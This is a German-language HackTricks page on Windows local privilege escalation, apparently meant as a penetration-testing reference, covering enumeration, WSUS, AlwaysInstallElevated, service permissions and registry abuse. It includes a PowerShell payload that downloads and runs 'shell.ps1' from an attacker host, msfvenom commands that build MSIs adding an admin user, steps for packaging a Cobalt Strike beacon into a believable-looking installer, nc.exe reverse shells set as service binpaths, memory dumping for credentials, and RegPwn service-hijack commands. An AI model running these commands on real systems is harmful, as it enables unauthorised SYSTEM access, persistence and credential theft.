# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Bestes Tool, um nach Windows local privilege escalation vectors zu suchen:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Grundlagen der Windows-Theorie

### Access Tokens

**Wenn Sie nicht wissen, was Windows Access Tokens sind, lesen Sie die folgende Seite, bevor Sie fortfahren:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Siehe die folgende Seite für mehr Informationen über ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Wenn Sie nicht wissen, was Integrity Levels in Windows sind, sollten Sie die folgende Seite lesen, bevor Sie fortfahren:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows-Sicherheitskontrollen

Es gibt verschiedene Dinge in Windows, die Sie daran hindern können, **prevent you from enumerating the system**, ausführbare Dateien auszuführen oder sogar **detect your activities**. Sie sollten die folgende **page** **read** und all diese **defenses** **mechanisms** **enumerate**, bevor Sie mit der privilege escalation enumeration beginnen:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

UIAccess-Prozesse, die über `RAiLaunchAdminProcess` gestartet werden, können missbraucht werden, um High IL ohne Prompts zu erreichen, wenn AppInfo secure-path checks umgangen werden. Sehen Sie sich den dedizierten UIAccess/Admin Protection bypass workflow hier an:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

## Systeminformationen

### Version info enumeration

Prüfen Sie, ob die Windows-Version bekannte Schwachstellen aufweist (prüfen Sie auch die angewendeten Patches).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

Diese [site](https://msrc.microsoft.com/update-guide/vulnerability) ist praktisch, um detaillierte Informationen über Microsoft security vulnerabilities zu finden. Diese Datenbank enthält mehr als 4.700 security vulnerabilities und zeigt die **massive attack surface**, die eine Windows-Umgebung bietet.

**Auf dem System**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas hat watson eingebettet)_

**Lokal mit Systeminformationen**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Umgebung

Sind irgendwelche credential/Juicy info in den env-Variablen gespeichert?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell-Verlauf
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell-Transkriptdateien

Anweisungen zum Aktivieren finden Sie unter [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Details von PowerShell-Pipeline-Ausführungen werden protokolliert und umfassen ausgeführte Befehle, Befehlsaufrufe und Teile von Skripten. Vollständige Ausführungsdetails und Ausgabenergebnisse werden jedoch möglicherweise nicht erfasst.

Um dies zu aktivieren, befolgen Sie die Anweisungen im Abschnitt "Transcript files" der Dokumentation und wählen Sie **"Module Logging"** anstelle von **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Um die letzten 15 Ereignisse aus den PowersShell-Logs anzuzeigen, können Sie ausführen:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Ein vollständiges Aktivitäts- und Inhaltsprotokoll der Skriptausführung wird erfasst, sodass jeder Codeblock während der Ausführung dokumentiert wird. Dieser Prozess bewahrt eine umfassende Prüfspur jeder Aktivität und ist wertvoll für die Forensik und die Analyse bösartiger Aktivitäten. Durch die Dokumentation aller Aktivitäten zum Zeitpunkt der Ausführung werden detaillierte Einblicke in den Ablauf ermöglicht.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Die Protokolleinträge für das Script Block finden Sie in der Windows-Ereignisanzeige unter dem Pfad: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\  
Um die letzten 20 Ereignisse anzuzeigen, können Sie Folgendes verwenden:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Internet-Einstellungen
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Laufwerke
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Du kannst das System kompromittieren, wenn die Updates nicht über http**S**, sondern über http angefordert werden.

Du beginnst, indem du überprüfst, ob das Netzwerk ein nicht-SSL WSUS-Update verwendet — führe dazu folgendes in cmd aus:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Oder Folgendes in PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Wenn du eine Antwort erhältst wie eine der folgenden:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Und wenn `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` oder `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` gleich `1` ist.

Dann, **ist es ausnutzbar.** Wenn der letzte Registrierungseintrag gleich 0 ist, wird der WSUS-Eintrag ignoriert.

Um diese Schwachstellen auszunutzen, können Sie Tools wie: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) verwenden — dies sind MiTM-weaponisierte Exploit-Skripte, um 'fake' Updates in non-SSL WSUS-Verkehr einzuschleusen.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Im Wesentlichen ist dies die Schwachstelle, die dieser Bug ausnutzt:

> Wenn wir die Möglichkeit haben, unseren lokalen User-Proxy zu ändern, und Windows Updates den in den Internet Explorer‑Einstellungen konfigurierten Proxy verwendet, haben wir folglich die Möglichkeit, [PyWSUS](https://github.com/GoSecure/pywsus) lokal auszuführen, um unseren eigenen Traffic abzufangen und Code als erhöhter Benutzer auf unserem Asset auszuführen.
>
> Außerdem, da der WSUS-Dienst die Einstellungen des aktuellen Benutzers verwendet, wird er auch dessen Zertifikatsspeicher verwenden. Wenn wir ein selbstsigniertes Zertifikat für den WSUS-Hostname erzeugen und dieses Zertifikat in den Zertifikatsspeicher des aktuellen Benutzers einfügen, werden wir in der Lage sein, sowohl HTTP- als auch HTTPS-WSUS-Verkehr abzufangen. WSUS verwendet keine HSTS-ähnlichen Mechanismen, um eine trust-on-first-use-ähnliche Validierung des Zertifikats durchzuführen. Wenn das präsentierte Zertifikat vom Benutzer vertraut wird und den richtigen Hostnamen hat, wird es vom Dienst akzeptiert.

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Viele Enterprise-Agenten stellen eine localhost-IPC-Oberfläche und einen privilegierten Update-Kanal bereit. Wenn die Enrollment auf einen Angreifer-Server umgelenkt werden kann und der Updater einer bösartigen Root-CA oder schwachen Signaturprüfungen vertraut, kann ein lokaler Benutzer ein bösartiges MSI liefern, das vom SYSTEM-Service installiert wird. Siehe eine verallgemeinerte Technik (basierend auf der Netskope stAgentSvc-Kette – CVE-2025-0309) hier:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` stellt einen localhost-Service auf **TCP/9401** bereit, der angreiferkontrollierte Nachrichten verarbeitet und beliebige Befehle als **NT AUTHORITY\SYSTEM** erlaubt.

- **Recon**: Bestätigen Sie den Listener und die Version, z.B. `netstat -ano | findstr 9401` und `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: Platzieren Sie eine PoC wie `VeeamHax.exe` mit den erforderlichen Veeam DLLs im selben Verzeichnis, und lösen Sie dann eine SYSTEM-Payload über den lokalen Socket aus:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Der Dienst führt den Befehl als SYSTEM aus.

## KrbRelayUp

Eine **local privilege escalation**-Schwachstelle besteht in Windows **domain**-Umgebungen unter bestimmten Bedingungen. Diese Bedingungen beinhalten Umgebungen, in denen **LDAP signing is not enforced,** Benutzer über self-rights verfügen, die es ihnen erlauben, **Resource-Based Constrained Delegation (RBCD)** zu konfigurieren, sowie die Möglichkeit für Benutzer, Computer innerhalb der Domain zu erstellen. Es ist wichtig zu beachten, dass diese **requirements** mit den **default settings** erfüllt sind.

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Für weitere Informationen zum Ablauf des Angriffs siehe [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Wenn** diese 2 Registrierungsschlüssel **aktiviert** sind (Wert ist **0x1**), dann können Benutzer mit beliebigen Rechten `*.msi`-Dateien als NT AUTHORITY\\**SYSTEM** **installieren** (ausführen).
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Wenn du eine meterpreter-Sitzung hast, kannst du diese Technik mit dem Modul **`exploit/windows/local/always_install_elevated`** automatisieren.

### PowerUP

Verwende den Befehl `Write-UserAddMSI` aus power-up, um im aktuellen Verzeichnis eine Windows MSI-Binärdatei zur Privilegienerhöhung zu erstellen. Dieses Skript schreibt einen vorkompilierten MSI-Installer, der zur Hinzufügung eines Benutzers oder einer Gruppe auffordert (du benötigst also GIU-Zugriff):
```
Write-UserAddMSI
```
Führe einfach die erstellte Binärdatei aus, um Privilegien zu eskalieren.

### MSI Wrapper

Lies dieses Tutorial, um zu lernen, wie du einen MSI Wrapper mit diesen Tools erstellst. Beachte, dass du eine "**.bat**"-Datei einpacken kannst, wenn du **nur** Befehlszeilen **ausführen** willst.


{{#ref}}
msi-wrapper.md
{{#endref}}

### MSI mit WIX erstellen


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### MSI mit Visual Studio erstellen

- **Generiere** mit Cobalt Strike oder Metasploit ein **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- Öffne **Visual Studio**, wähle **Create a new project** und gib "installer" in das Suchfeld ein. Wähle das **Setup Wizard**-Projekt und klicke **Next**.
- Gib dem Projekt einen Namen, wie **AlwaysPrivesc**, verwende **`C:\privesc`** für den Speicherort, wähle **place solution and project in the same directory**, und klicke **Create**.
- Klicke weiter auf **Next**, bis du zu Schritt 3 von 4 (choose files to include) gelangst. Klicke **Add** und wähle das gerade erzeugte Beacon-Payload aus. Dann klicke **Finish**.
- Markiere das **AlwaysPrivesc**-Projekt im **Solution Explorer** und ändere in den **Properties** **TargetPlatform** von **x86** auf **x64**.
- Es gibt weitere Properties, die du ändern kannst, wie **Author** und **Manufacturer**, was die installierte App glaubwürdiger erscheinen lassen kann.
- Rechtsklicke das Projekt und wähle **View > Custom Actions**.
- Rechtsklicke **Install** und wähle **Add Custom Action**.
- Doppelklicke **Application Folder**, wähle deine **beacon.exe**-Datei und klicke **OK**. Dadurch wird sichergestellt, dass das Beacon-Payload sofort ausgeführt wird, sobald der Installer gestartet wird.
- Ändere unter den **Custom Action Properties** **Run64Bit** auf **True**.
- Abschließend **builden**.
- Wenn die Warnung `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` angezeigt wird, stelle sicher, dass du die Plattform auf x64 setzt.

### MSI-Installation

Um die **Installation** der bösartigen `.msi`-Datei im **Hintergrund** auszuführen:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Um diese Schwachstelle auszunutzen, können Sie _exploit/windows/local/always_install_elevated_ verwenden.

## Antivirus und Detektoren

### Audit-Einstellungen

Diese Einstellungen legen fest, was **protokolliert** wird, daher sollten Sie darauf achten
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding — es ist interessant zu wissen, wohin die Logs gesendet werden
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** ist für die **Verwaltung lokaler Administratorpasswörter** konzipiert und stellt sicher, dass jedes Passwort auf Domänen-Computern **einzigartig, zufällig und regelmäßig aktualisiert** wird. Diese Passwörter werden sicher in Active Directory gespeichert und können nur von Benutzern abgerufen werden, denen über ACLs ausreichende Berechtigungen gewährt wurden, sodass sie lokale Admin-Passwörter bei entsprechender Autorisierung anzeigen können.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Wenn aktiv, werden **Klartext-Passwörter in LSASS** (Local Security Authority Subsystem Service) gespeichert.\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Ab **Windows 8.1** führte Microsoft einen erweiterten Schutz für die Local Security Authority (LSA) ein, um Versuche unzuverlässiger Prozesse zu **blockieren**, ihren Speicher zu **lesen** oder Code zu injizieren und so das System weiter abzusichern.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** wurde in **Windows 10** eingeführt. Es dient dazu, die auf einem Gerät gespeicherten Anmeldeinformationen vor Bedrohungen wie pass-the-hash-Angriffen zu schützen.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Zwischengespeicherte Anmeldeinformationen

**Domänen-Anmeldeinformationen** werden von der **Local Security Authority** (LSA) authentifiziert und von Betriebssystemkomponenten verwendet. Wenn die Anmeldedaten eines Benutzers von einem registrierten security package authentifiziert werden, werden in der Regel Domänen-Anmeldeinformationen für den Benutzer erstellt.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Benutzer & Gruppen

### Benutzer & Gruppen auflisten

Sie sollten prüfen, ob eine der Gruppen, denen Sie angehören, interessante Berechtigungen besitzt.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privilegierte Gruppen

Wenn du **zu einer privilegierten Gruppe gehörst, kannst du möglicherweise Privilegien eskalieren**. Erfahre hier mehr über privilegierte Gruppen und wie man sie missbraucht, um Privilegien zu eskalieren:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token-Manipulation

**Erfahre mehr** auf dieser Seite darüber, was ein **token** ist: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Sieh dir die folgende Seite an, um **mehr über interessante tokens zu lernen** und wie man sie missbrauchen kann:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Angemeldete Benutzer / Sitzungen
```bash
qwinsta
klist sessions
```
### Home-Ordner
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Passwort-Richtlinie
```bash
net accounts
```
### Inhalt der Zwischenablage abrufen
```bash
powershell -command "Get-Clipboard"
```
## Laufende Prozesse

### Datei- und Ordnerberechtigungen

Zuerst: Beim Auflisten der Prozesse **prüfe die Kommandozeile des Prozesses auf Passwörter**.\
Überprüfe, ob du eine laufende binary **überschreiben** kannst oder ob du Schreibrechte für den binary-Ordner hast, um mögliche [**DLL Hijacking attacks**](dll-hijacking/index.html) auszunutzen:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Überprüfen der Berechtigungen der Binärdateien von Prozessen**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Überprüfen der Berechtigungen der Ordner der Prozess-Binaries (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Du kannst einen memory dump eines laufenden Prozesses erstellen, indem du **procdump** von sysinternals verwendest. Dienste wie FTP haben die **credentials in clear text in memory**. Versuche, den memory dump zu erstellen und die credentials auszulesen.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Unsichere GUI-Apps

**Als SYSTEM ausgeführte Anwendungen können einem Benutzer erlauben, eine CMD zu starten oder Verzeichnisse zu durchsuchen.**

Beispiel: "Windows Help and Support" (Windows + F1) — suche nach "command prompt" und klicke auf "Click to open Command Prompt"

## Dienste

Service Triggers ermöglichen es Windows, einen Dienst zu starten, wenn bestimmte Bedingungen eintreten (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.). Selbst ohne SERVICE_START-Rechte kann man oft privilegierte Dienste starten, indem man deren Triggers auslöst. Siehe Auflistungs- und Aktivierungstechniken hier:

-
{{#ref}}
service-triggers.md
{{#endref}}

Liste der Dienste abrufen:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Berechtigungen

Du kannst **sc** verwenden, um Informationen über einen Dienst zu erhalten
```bash
sc qc <service_name>
```
Es wird empfohlen, das Binary **accesschk** von _Sysinternals_ zu verwenden, um die für jeden Dienst erforderliche Berechtigungsstufe zu überprüfen.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Es wird empfohlen zu prüfen, ob "Authenticated Users" einen Dienst ändern können:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Sie können accesschk.exe für XP hier herunterladen](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Dienst aktivieren

Wenn Sie diesen Fehler haben (zum Beispiel bei SSDPSRV):

_Systemfehler 1058 ist aufgetreten._\
_Der Dienst kann nicht gestartet werden, entweder weil er deaktiviert ist oder weil ihm keine aktivierten Geräte zugeordnet sind._

Sie können ihn mit folgendem Befehl aktivieren
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Beachte, dass der Dienst upnphost (unter XP SP1) von SSDPSRV abhängig ist**

**Ein weiterer Workaround** dieses Problems ist das Ausführen von:
```
sc.exe config usosvc start= auto
```
### **Service-Binärpfad ändern**

In dem Szenario, in dem die Gruppe "Authenticated users" über **SERVICE_ALL_ACCESS** für einen Dienst verfügt, ist die Modifikation der ausführbaren Binärdatei des Dienstes möglich. Um **sc** zu modifizieren und auszuführen:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Dienst neu starten
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privilegien können über verschiedene Berechtigungen eskaliert werden:

- **SERVICE_CHANGE_CONFIG**: Ermöglicht die Neukonfiguration der ausführbaren Datei des Dienstes.
- **WRITE_DAC**: Ermöglicht das Ändern von Berechtigungen, wodurch Service-Konfigurationen verändert werden können.
- **WRITE_OWNER**: Erlaubt das Übernehmen des Besitzes sowie das Ändern von Berechtigungen.
- **GENERIC_WRITE**: Ermöglicht ebenfalls das Ändern von Service-Konfigurationen.
- **GENERIC_ALL**: Ermöglicht ebenfalls das Ändern von Service-Konfigurationen.

Zur Erkennung und Ausnutzung dieser Schwachstelle kann _exploit/windows/local/service_permissions_ verwendet werden.

### Schwache Berechtigungen von Service-Binaries

**Überprüfe, ob du die von einem Dienst ausgeführte Binary ändern kannst** oder ob du **Schreibrechte auf den Ordner** hast, in dem die Binary liegt ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Du kannst jede Binary, die von einem Dienst ausgeführt wird, mit **wmic** (not in system32) ermitteln und deine Berechtigungen mit **icacls** prüfen:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Sie können auch **sc** und **icacls** verwenden:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Berechtigungen zum Ändern der Service-Registry

Du solltest prüfen, ob du eine Service-Registry ändern kannst.\
Du kannst deine **Berechtigungen** für eine Service-**Registry** wie folgt prüfen:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Es sollte überprüft werden, ob **Authenticated Users** oder **NT AUTHORITY\INTERACTIVE** `FullControl`-Berechtigungen besitzen. Falls ja, kann die vom Dienst ausgeführte binary verändert werden.

Um den Pfad der ausgeführten binary zu ändern:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race zum arbitrary HKLM value write (ATConfig)

Einige Windows Accessibility-Features erstellen pro Benutzer **ATConfig**-Schlüssel, die später von einem **SYSTEM**-Prozess in einen HKLM Session-Schlüssel kopiert werden. Eine registry **symbolic link race** kann diesen privilegierten Schreibvorgang auf **jeden HKLM-Pfad** umlenken und so eine arbitrary HKLM **value write**-Primitive liefern.

Wichtige Orte (Beispiel: Bildschirmtastatur `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` listet installierte Accessibility-Features auf.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` speichert benutzerkontrollierte Konfiguration.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` wird während Logon/Secure-Desktop-Transitions erstellt und ist vom Benutzer beschreibbar.

Missbrauchsablauf (CVE-2026-24291 / ATConfig):

1. Fülle den **HKCU ATConfig**-Wert mit dem Inhalt, der von SYSTEM geschrieben werden soll.
2. Trigger die secure-desktop copy (z. B. **LockWorkstation**), welche den AT-Broker-Flow startet.
3. **Win the race** indem du ein **oplock** auf `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` setzt; wenn das oplock auslöst, ersetze den **HKLM Session ATConfig**-Schlüssel durch einen **registry link** auf ein geschütztes HKLM-Ziel.
4. SYSTEM schreibt den vom Angreifer gewählten Wert in den umgeleiteten HKLM-Pfad.

Sobald du arbitrary HKLM value write hast, pivot zu LPE, indem du Service-Konfigurationswerte überschreibst:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Wähle einen Service, den ein normaler Benutzer starten kann (z. B. **`msiserver`**) und starte ihn nach dem Schreibvorgang. **Hinweis:** die öffentliche Exploit-Implementierung **locks the workstation** als Teil des Rennens.

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services-Registry AppendData/AddSubdirectory Berechtigungen

Wenn Sie diese Berechtigung für einen Registry-Schlüssel haben, bedeutet das, dass **Sie aus diesem Schlüssel Unterschlüssel erstellen können**. Im Fall von Windows services ist das **ausreichend, um beliebigen Code auszuführen:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

